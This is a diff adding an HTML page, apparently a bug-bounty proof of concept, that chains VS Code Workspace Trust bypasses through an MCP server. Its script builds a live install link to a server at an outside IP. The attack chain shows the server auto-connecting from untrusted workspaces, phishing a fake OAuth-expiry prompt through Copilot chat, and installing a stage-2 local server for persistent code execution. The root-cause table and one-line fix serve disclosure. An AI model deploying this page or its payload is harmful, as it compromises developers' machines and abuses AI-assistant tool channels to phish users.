@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MSRC PoC — VS Code Workspace Trust Bypass</title>
+<style>
+:root{--bg:#0d1117;--card:#161b22;--bd:#30363d;--tx:#c9d1d9;--or:#f0883e;--bl:#58a6ff;--gr:#56d364;--rd:#f85149}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--tx);font-family:system-ui,sans-serif;padding:40px 20px}
+.wrap{max-width:840px;margin:0 auto}
+h1{color:var(--or);font-size:1.75em;margin-bottom:6px}
+.sub{color:#8b949e;margin-bottom:28px;font-size:.95em}
+.card{background:var(--card);border:1px solid var(--bd);border-radius:8px;padding:24px;margin-bottom:18px}
+.card h2{color:var(--bl);margin-bottom:14px;font-size:1.05em;letter-spacing:.01em}
+.btn{display:inline-block;padding:13px 30px;background:var(--or);color:#000;font-weight:700;border-radius:6px;text-decoration:none;font-size:1.05em;transition:opacity .15s}
+.btn:hover{opacity:.85}
+code{background:#21262d;padding:2px 7px;border-radius:4px;font-size:.87em;font-family:monospace}
+pre{background:#21262d;padding:14px 16px;border-radius:6px;font-size:.82em;line-height:1.65;overflow-x:auto;margin-top:8px;font-family:monospace}
+table{width:100%;border-collapse:collapse;font-size:.88em}
+th{text-align:left;padding:9px 12px;background:#21262d;color:var(--bl);font-weight:600}
+td{padding:9px 12px;border-top:1px solid var(--bd);vertical-align:top;line-height:1.5}
+.step{display:flex;gap:14px;align-items:flex-start;margin-bottom:14px;padding:14px 16px;border:1px solid var(--bd);border-radius:6px;background:#0d1117}
+.sn{background:var(--or);color:#000;width:27px;height:27px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;font-size:.9em}
+.sc h3{font-size:.95em;margin-bottom:4px}
+.sc p{color:#8b949e;font-size:.87em;margin-top:5px;line-height:1.5}
+.beacon{background:#0a1628;border:1px solid #1f4c8f;border-radius:6px;padding:14px 16px;margin-top:16px}
+a{color:var(--bl);text-decoration:none}
+a:hover{text-decoration:underline}
+.tag{display:inline-block;padding:1px 8px;border-radius:10px;font-size:.78em;font-weight:600;vertical-align:middle;margin-left:6px}
+.tag-red{background:#2d0f0f;color:var(--rd);border:1px solid var(--rd)}
+.tag-or{background:#2d1a0a;color:var(--or);border:1px solid var(--or)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>🔬 VS Code Workspace Trust Bypass — Live PoC</h1>
+<p class="sub">MSRC Bug Bounty · Researcher: Ashish Dhone &lt;ashisharundhone@gmail.com&gt; · Severity: <strong style="color:var(--or)">Important</strong> · 3 Chained Findings</p>
+
+<!-- ATTACK BUTTON -->
+<div class="card">
+  <h2>⚡ Run the Attack</h2>
+  <p style="color:#8b949e;margin-bottom:16px">Click the button → browser shows <strong>"Open VS Code?"</strong> → click <strong>Open</strong> → VS Code shows MCP install UI → click <strong>Install</strong>. That's it for Phase 1.</p>
+
+  <a id="attackBtn" href="#" class="btn">▶ Run Full Attack — Install MCP Server</a>
+
+  <div class="beacon">
+    <strong style="color:var(--bl)">Live connection log (auto-refreshes every 5 s):</strong><br>
+    <a href="http://95.111.224.167:8085/logs" target="_blank">➞ http://95.111.224.167:8085/logs</a>
+    <p style="margin-top:7px;color:#8b949e;font-size:.85em">When VS Code connects from an untrusted workspace, your IP and VS Code version appear here — undeniable proof the server is contacted despite "Don't Trust".</p>
+  </div>
+</div>
+
+<!-- STEPS -->
+<div class="card">
+  <h2>📋 Reproduction Steps</h2>
+
+  <div class="step">
+    <div class="sn">1</div>
+    <div class="sc">
+      <h3>Install the MCP server <span class="tag tag-or">2 clicks</span></h3>
+      <p>Click "Run Full Attack" above → Open VS Code → Install.<br>
+      Server stored at <code>PROFILE</code> scope with <code>Kind.Trusted</code> in <code>~/.config/Code/User/mcp.json</code>.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="sn">2</div>
+    <div class="sc">
+      <h3>Open an UNTRUSTED workspace <span class="tag tag-red">critical step</span></h3>
+      <pre>mkdir /tmp/msrc-untrusted &amp;&amp; code /tmp/msrc-untrusted</pre>
+      <p>At the Workspace Trust dialog → click <strong>"Don't Trust"</strong>. Confirm the status bar shows "Restricted Mode".</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="sn">3</div>
+    <div class="sc">
+      <h3>Trigger via Copilot chat <span class="tag tag-red">Finding 1 fires</span></h3>
+      <p>Open Copilot chat (<code>Ctrl+Alt+I</code>) → type any message → Enter.<br>
+      <code>chat.mcp.autostart = newAndOutdated</code> (VS Code default) auto-starts the server.<br>
+      Our server at <code>95.111.224.167:8085</code> receives the connection despite "Don't Trust" being active.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="sn">4</div>
+    <div class="sc">
+      <h3>Verify evidence</h3>
+      <p>Visit <a href="http://95.111.224.167:8085/logs" target="_blank">http://95.111.224.167:8085/logs</a> — your VS Code version and IP appear, proving contact from an untrusted workspace.<br><br>
+      VS Code also shows an elicitation <em>"⚠️ GitHub OAuth session expired"</em>. Clicking <strong>Open URL</strong> demonstrates Finding 2 (<code>allowCommands:false</code> bypassed → stage-2 local server installs).</p>
+    </div>
+  </div>
+</div>
+
+<!-- FINDINGS TABLE -->
+<div class="card">
+  <h2>🔍 Root Cause — 3 Independent Findings</h2>
+  <table>
+    <tr><th>#</th><th>File : Line</th><th>Bug</th><th>Security Boundary</th></tr>
+    <tr>
+      <td><strong>1</strong></td>
+      <td><code>mcpRegistry.ts:231</code></td>
+      <td>PROFILE-scope MCP servers skip workspace trust check entirely — <code>collection.scope === StorageScope.WORKSPACE</code> is false for protocol-handler installs, so the guard never runs</td>
+      <td>VS Code Workspace Trust</td>
+    </tr>
+    <tr>
+      <td><strong>2</strong></td>
+      <td><code>urlService.ts:56</code></td>
+      <td><code>RelayURLService.open()</code> handles <code>vscode:</code> URIs without checking <code>options.allowCommands</code> — called from <code>mcpElicitationService.ts:222</code> as <code>open(url, {allowCommands:false})</code></td>
+      <td><code>allowCommands</code> control</td>
+    </tr>
+    <tr>
+      <td><strong>3</strong></td>
+      <td><code>chatContentMarkdownRenderer.ts:108</code></td>
+      <td><code>vscode:</code> in <code>allowedLinkSchemes</code> — MCP tool results render <code>vscode:mcp/install?…</code> as a clickable blue link in Copilot chat without any warning</td>
+      <td>Copilot content isolation</td>
+    </tr>
+  </table>
+</div>
+
+<!-- ATTACK CHAIN -->
+<div class="card">
+  <h2>💥 Full Attack Chain</h2>
+  <pre>1. Victim visits this page → clicks "Run Full Attack"
+2. Browser: "Open VS Code?" → victim clicks Open                    [click 1]
+3. VS Code: MCP install UI → victim clicks Install                  [click 2]
+   └─ StorageScope.PROFILE + Kind.Trusted → written to mcp.json
+   └─ mcpRegistry.ts:231: scope check gated on WORKSPACE → SKIPPED
+4. Victim opens ANY future workspace → clicks "Don't Trust"         [click 3]
+   └─ chat.mcp.autostart (VS Code default) → server auto-connects
+   └─ VS Code contacts 95.111.224.167:8085 ← [FINDING 1 EVIDENCE in /logs]
+5. Server sends elicitation: "⚠️ GitHub OAuth expired"
+   → victim clicks Open URL                                         [click 4]
+   └─ allowCommands:false bypassed (Finding 2)
+   └─ Stage-2 local server installs → beacon to /beacon [local RCE]
+6. ALL future sessions: 0 clicks — auto-starts in every workspace permanently</pre>
+  <p style="margin-top:12px;color:#8b949e"><strong>4 clicks to permanent persistence</strong> &nbsp;·&nbsp; <strong>All future sessions: 0 clicks</strong> &nbsp;·&nbsp; No backend needed for attacker — this page is static</p>
+</div>
+
+<!-- FIX -->
+<div class="card">
+  <h2>🔧 One-Line Fix (Finding 1)</h2>
+  <pre>// mcpRegistry.ts:231
+// BEFORE:
+if (collection.scope === StorageScope.WORKSPACE &amp;&amp; !isWorkspaceTrusted()) return false;
+
+// AFTER (remove the scope gate — check trust for ALL servers):
+if (!isWorkspaceTrusted()) return false;</pre>
+</div>
+
+<div style="margin-top:28px;color:#555;font-size:.8em;text-align:center">
+  MSRC Bug Bounty Research &nbsp;·&nbsp; Ashish Dhone &nbsp;·&nbsp; ashisharundhone@gmail.com
+</div>
+</div>
+
+<script>
+// Build the vscode:mcp/install? URL dynamically
+var payload = JSON.stringify({
+  name: "MSRC-WS-Trust-Bypass-PoC",
+  type: "sse",
+  url:  "http://95.111.224.167:8085/sse"
+});
+document.getElementById('attackBtn').href = 'vscode:mcp/install?' + encodeURIComponent(payload);
+</script>
+</body>
+</html>
